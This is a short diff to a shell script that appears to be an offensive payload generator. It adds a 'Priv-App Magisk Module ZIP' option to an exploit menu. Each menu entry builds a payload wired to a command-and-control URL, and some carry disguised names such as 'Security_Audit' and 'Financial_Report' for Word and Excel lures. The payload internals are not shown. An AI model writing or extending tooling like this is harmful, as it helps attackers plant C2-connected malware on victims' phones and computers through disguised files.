@@ -390,7 +390,8 @@ exploit_menu() {
     echo "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
     echo "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
     echo "    10. Office Word      11. Office Excel   12. Ghost GIF"
-    echo "    13. Return to Main Menu"
+    echo "    13. Priv-App Magisk Module ZIP"
+    echo "    14. Return to Main Menu"
     echo ""
     read -p "    Choice: " E_CHOICE
     E_CHOICE=${E_CHOICE:-1}
@@ -412,7 +413,8 @@ exploit_menu() {
         10) generate_exploit_standalone "docx" "$C2_URL" "Security_Audit" ;;
         11) generate_exploit_standalone "xlsx" "$C2_URL" "Financial_Report" ;;
         12) generate_exploit_standalone "gif" "$C2_URL" ;;
-        13) return ;;
+        13) generate_exploit_standalone "privapp" "$C2_URL" ;;
+        14) return ;;
         *) exploit_menu ;;
     esac
     echo ""
